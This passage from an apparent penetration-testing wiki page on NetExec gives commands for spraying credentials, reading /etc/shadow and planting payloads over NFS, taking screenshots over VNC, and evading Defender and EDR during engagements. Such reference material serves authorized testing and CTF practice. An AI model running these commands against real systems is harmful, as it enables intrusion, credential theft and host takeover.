nxc ssh <target> -u users.txt -p pass.txt --no-bruteforce --continue-on-success
```

`(Pwn3d!)` on SSH means root. For real SSH brute forcing use [[wiki/tools/hydra]]; nxc is for validating a captured credential across a subnet.

## FTP protocol

```bash
nxc ftp <target> -u '' -p ''                       # anonymous login check
nxc ftp <target> -u marshall -p 'pass' --port 2121
nxc ftp <target> -u marshall -p 'pass' --ls        # directory listing with permissions
nxc ftp <target> -u frank -p pass --get flag.txt
nxc ftp <target> -u frank -p pass --put local.txt remote.txt
nxc ftp <target> -u users.txt -p pass.txt --no-bruteforce --continue-on-success
```

## NFS protocol

```bash
nxc nfs <target>                                   # versions + "root escape:True/False"
nxc nfs <target> --shares                          # exports with UID, perms, usage, access list
nxc nfs <target> --enum-shares                     # recursive file listing (default depth 3)
nxc nfs <target> --enum-shares 5
nxc nfs <target> --share '/var/nfs/general' --ls '/'
nxc nfs <target> --ls '/'                          # no --share: uses the root escape
nxc nfs <target> --share /export/ --get-file secret.txt secret.txt
nxc nfs <target> --get-file /etc/shadow shadow
nxc nfs <target> --put-file payload.sh /home/user/
nxc nfs <target> --chmod ...                       # uploads default to 777
```

`root escape:True` means an export lacks `subtree_check`, so the static root file handle reaches the whole filesystem: read `/etc/exports` first, then `/etc/shadow` (owned `root:shadow`, readable without `no_root_squash`). With `rw` plus `no_root_squash` you can rewrite `/etc/passwd` and own the host outright. See [[network-service-attacks]].

## VNC protocol

```bash
nxc vnc <target>                                   # "No Auth:True" means open desktop
nxc vnc <target> -u '' -p 'password'               # VNC has no usernames, -u is ignored
nxc vnc <target> --port 5901
nxc vnc <target> -u '' -p pass --screenshot --screentime 10
nxc vnc <target> --vnc-sleep 5                     # avoid rate limiting
```

Screenshots land in `~/.nxc/screenshots/`.

---

## Tips and gotchas

**Read `--pass-pol` before you spray.** Full-matrix `-u users.txt -p passwords.txt` against a domain locks accounts. Use `--no-bruteforce` for paired lists, one password per observation window, and `--jitter` to throttle. Throttling is per host, so spraying a /24 multiplies your rate.

**`--continue-on-success` is mandatory for spraying and incompatible with `-x`.** Without it nxc stops at the first valid credential per target, so you miss every other valid account.

**`--no-bruteforce` pairs index for index.** `user[0]:pass[0]`, `user[1]:pass[1]`, and so on. Passing the same file to both `-u` and `-p` is the username-equals-password check. Avoid IP ranges with this flag.

**Kerberos needs names, not IPs.** If NTLM is disabled, `-k` requires the hostname and realm. Fix DNS first with `--generate-hosts-file /etc/hosts`, and generate a config with `--generate-krb5-file` plus `export KRB5_CONFIG=`. Clock skew shows as `KRB_AP_ERR_SKEW`; sync with `sudo ntpdate <dc_ip>` (the attacker clock must be within 5 minutes of the DC).

**Purge stale `/etc/hosts` entries between engagements.** `--generate-hosts-file` appends, so an old realm line from a previous box silently breaks Kerberos on the next one.

**Credentials starting with a dash break argparse.** Use the long form with an equals sign: `-u='-username' -p='-October2022'`. Wrap anything with special characters (especially `!`) in single quotes.

**`STATUS_PASSWORD_MUST_CHANGE` is a valid credential, not a failure.** nxc colours it magenta. Use `-M change-password -o NEWPASS=...` to set a new one and continue; no Windows session needed.

**Guest is not null.** `-u '' -p ''` is an anonymous session; `-u 'a' -p ''` tests the guest account. Guest being enabled is enough for coercion attacks and often for share reads that null sessions are denied.

**`--rid-brute` works when `--users` does not.** It cycles RIDs over a null or guest session. Turn it into a wordlist:

```bash
nxc smb <dc> -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users.txt
```

**Use kerbrute for big user lists.** `kerbrute userenum` validates ~500 users in seconds over UDP; `nxc smb -u <file>` walks them one TCP session at a time. Keep nxc for the one-off credential check and the spray.

**Session flags are not equivalent.** `--loggedon-users` (wkssvc) and `--reg-sessions` (winreg) show logon contexts; only `--qwinsta` proves the interactive session that `schtask_as` needs. Checking the wrong one wastes an impersonation attempt.

**Defender can eat `-x` output.** "could not retrieve output file" usually means the exec worked but retrieval was blocked. Try `--exec-method smbexec` or `atexec`, or skip execution entirely when you only need to read a file: `smbclient //<host>/C$ -U <dom>/Administrator --pw-nt-hash <nt> -c 'get Users\Administrator\Desktop\flag.txt'`.

**Prefer native flags over `-x` for enumeration.** `--tasklist keepass.exe` uses a native protocol; `-x 'tasklist /v /fo csv | findstr lsass'` is one of the loudest possible EDR triggers. Same for `--qwinsta` over `-x qwinsta`.

**`(Pwn3d!)` means different things per protocol.** SMB Pwn3d is local admin; WinRM Pwn3d is Remote Management Users; RDP `[+]` without Pwn3d is a valid credential with no RDP logon right. Do not report the weaker one as admin access.

**`coerce_plus` defaults to a localhost listener,** so the bare module is a safe vulnerability check that puts nothing on the wire. Only set `LISTENER` when you actually have a relay or capture running.

**`--shares` is the highest-value single flag in the tool.** Run it with every new credential you capture, across the whole subnet. Follow with `spider_plus` before manual browsing.

**Reuse loot immediately.** Every new credential should be replayed across `smb`, `winrm`, `mssql`, `rdp`, `ssh`, and `ldap` on the known host list before you research anything new. nxcdb `-id` makes this cheap.

**Enable BloodHound integration once, benefit all engagement.** With `bh_enabled = True`, every account nxc validates (including 20 credentials from one lsassy dump) is marked owned automatically, which reshapes every path query.

**Audit mode for client demos.** `audit_mode = *` in nxc.conf redacts credentials from console output, so screen shares and screenshots stay safe without post-processing.

**The nxc home folder is engagement evidence.** `~/.nxc/` holds the database, spider output, screenshots, ccaches, and module loot. Set `NXC_PATH` per engagement to keep clients separated.

## Related techniques

- [[pass-the-hash]]
- [[ad-enumeration]]
- [[ad-lateral-movement]]
- [[ad-privilege-escalation]]
- [[password-spraying]]
- [[roasting-kerberoasting]]
- [[roasting-asrep-roasting]]
- [[active-directory-ntds-dumping]]
- [[internal-ntlm-relay]]
- [[internal-coerce]]
- [[kerberos-delegation-resource-based-constrained-delegation]]
- [[windows-dpapi]]
- [[password-laps]]
- [[password-gmsa]]
- [[adcs]]
- [[mssql-command-execution]]
- [[authentication-attacks]]
- [[password-cracking]]

## Sources

- Official NetExec wiki, https://www.netexec.wiki (full ingest, all protocol and module pages plus v1.0.0 to v1.4.0 release notes)
- 0xdf HTB writeups: administrator, authority, axlle, baby, babytwo, blackfield, blazorized, bookworm, breach, bruno, analysis, certified, vulncicada
